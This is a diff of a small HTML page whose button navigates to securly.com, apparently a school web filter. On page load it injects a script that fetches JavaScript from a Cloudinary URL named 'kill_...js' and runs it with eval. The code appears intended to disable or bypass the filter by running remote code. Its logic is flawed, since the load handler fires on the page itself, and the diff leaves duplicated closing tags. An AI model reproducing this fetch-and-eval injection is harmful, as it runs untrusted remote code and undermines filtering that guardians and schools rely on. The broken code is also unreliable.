@@ -3,46 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inject JS into iFrame</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        iframe {
-            width: 80%;
-            height: 60%;
-            border: none;
-        }
-        button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-        }
-    </style>
+    <title>Navigate and Inject Script</title>
 </head>
 <body>
-    <iframe id="myIframe" src="https://securly.com"></iframe>
-    <button onclick="injectScript()">Inject Script</button>
+    <button onclick="navigateAndInject()">Navigate to Securly and Inject Script</button>
 
     <script>
-        function injectScript() {
-            const iframe = document.getElementById('myIframe');
+        function navigateAndInject() {
+            // Navigate to securly.com
+            window.location.href = 'https://securly.com';
+        }
+
+        // Listen for the page load event
+        window.addEventListener('load', function() {
+            // Inject the script after the page loads
             const scriptContent = `fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js')
                                     .then(r => r.text())
                                     .then(r => eval(r));`;
-            
+
             const script = document.createElement('script');
             script.type = 'text/javascript';
             script.innerHTML = scriptContent;
 
-            const iframeDoc = iframe.contentWindow.document;
-            iframeDoc.body.appendChild(script);
-        }
+            document.body.appendChild(script);
+        });
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
